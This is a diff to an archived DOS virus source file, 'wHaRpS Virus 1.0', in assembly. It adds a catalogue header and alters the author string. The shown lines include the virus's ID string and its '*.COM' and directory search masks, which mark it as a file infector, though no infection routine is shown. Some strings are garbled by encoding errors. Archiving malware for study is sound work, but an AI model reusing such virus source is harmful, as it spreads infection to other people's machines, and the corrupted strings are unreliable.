@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      W
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 ; "One must crawl before one walks." 
 ;                              wHaRpS Virus 1.0
 ; wHaRpS virus of independent virus writer FirstStrike
@@ -72,7 +83,7 @@ endp
 
 data    label   byte
 wharps    db    '[wHaRpS]',0            ; wHaRpS ID
-author    db    'FŒrsØStrŒkä',0         ; Me
+author    db    'Fï¿½rsï¿½Strï¿½kï¿½',0         ; Me
 dir_mask  db    '*.',0                  ; dir atrib
 allcom    db    '*.COM',0               ; what to search for
 root      db    '\',0                   ; root
